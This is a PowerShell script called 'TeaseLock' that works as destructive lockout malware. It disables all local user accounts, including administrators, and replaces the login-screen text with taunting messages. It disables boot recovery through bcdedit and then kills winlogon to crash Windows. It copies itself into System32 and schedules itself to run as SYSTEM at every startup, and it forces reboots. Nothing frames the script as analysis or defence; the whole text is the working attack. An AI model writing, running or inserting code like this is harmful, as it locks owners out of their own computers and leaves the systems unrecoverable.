# DISABLE ALL USERS (INCLUDING ADMIN)
$users = Get-WmiObject -Class Win32_UserAccount -Filter "LocalAccount=True"
foreach ($user in $users) {
    if ($user.Disabled -eq $false) {
        Disable-LocalUser -Name $user.Name
    }
}

# SETUP RESTART TRACKER (Registry-Based)
$regPath = "HKLM:\SOFTWARE\TeaseLock"
if (!(Test-Path $regPath)) {
    New-Item -Path $regPath -Force | Out-Null
}

$restartCount = (Get-ItemProperty -Path $regPath -Name "RestartCount" -ErrorAction SilentlyContinue).RestartCount
if ($restartCount -eq $null) {
    $restartCount = 0
}

# MODIFY WINDOWS LOGIN SCREEN TEXT BASED ON RESTART COUNT
$systemRegPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"

if ($restartCount -eq 0) {
    New-ItemProperty -Path $systemRegPath -Name "LegalNoticeCaption" -Value "Oh? Trying to log in?" -PropertyType String -Force
    New-ItemProperty -Path $systemRegPath -Name "LegalNoticeText" -Value "Ah~ Sweetheart, you're locked out <3 Try again later~ ;)" -PropertyType String -Force
    $restartCount = 1
}

elseif ($restartCount -eq 1) {
    New-ItemProperty -Path $systemRegPath -Name "LegalNoticeCaption" -Value "Persistent, aren't we?" -PropertyType String -Force
    New-ItemProperty -Path $systemRegPath -Name "LegalNoticeText" -Value "Round two, darling~? You’ll have to wait longer this time~ ;)" -PropertyType String -Force
    $restartCount = 2
}

elseif ($restartCount -eq 2) {
    New-ItemProperty -Path $systemRegPath -Name "LegalNoticeCaption" -Value "Oh dear~ You really tried..." -PropertyType String -Force
    New-ItemProperty -Path $systemRegPath -Name "LegalNoticeText" -Value "Too bad, love~ No more chances <3 See you never~!" -PropertyType String -Force

    # DISABLE RECOVERY & FORCE NETWORK BOOT
    bcdedit /set {current} bootstatuspolicy ignoreallfailures
    bcdedit /set {current} recoveryenabled no
    bcdedit /set {default} bootmenupolicy legacy

    # TRIGGER BSOD (Crash Windows)
    Stop-Process -Name "winlogon" -Force
}

# SAVE RESTART COUNT
Set-ItemProperty -Path $regPath -Name "RestartCount" -Value $restartCount -Force

# ENSURE SCRIPT RUNS AFTER REBOOT
$scriptPath = "C:\Windows\System32\TeaseLock.ps1"
$taskName = "TeaseLockAutoRun"

# Copy script to a safe location
Copy-Item -Path $MyInvocation.MyCommand.Path -Destination $scriptPath -Force

# Schedule the script to run at **every startup** until the BSOD
schtasks /create /tn $taskName /tr "powershell -ExecutionPolicy Bypass -File $scriptPath" /sc onstart /ru SYSTEM /f

# FORCE RESTART (No PowerShell GUI)
shutdown /r /f /t 5
